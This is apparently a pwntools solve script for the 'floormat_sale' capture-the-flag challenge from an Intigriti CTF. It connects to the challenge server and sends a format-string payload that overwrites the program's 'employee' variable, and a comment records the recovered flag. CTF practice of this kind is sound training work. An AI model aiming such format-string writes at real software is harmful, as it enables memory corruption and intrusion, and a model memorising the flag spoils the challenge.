#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./floormat_sale", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("floormatsale.ctf.intigriti.io", 1339)

p.sendlineafter(b"your choice:\r\n", str(6).encode())

payload = fmtstr_payload(10, {elf.sym["employee"]: 1 & 0xff})
p.sendlineafter(b"shipping address:\r\n", payload)

p.readuntil(b"delivered to: ")
print(p.readline()[:-2].decode()) # INTIGRITI{3v3ry_fl00rm47_mu57_60!!}
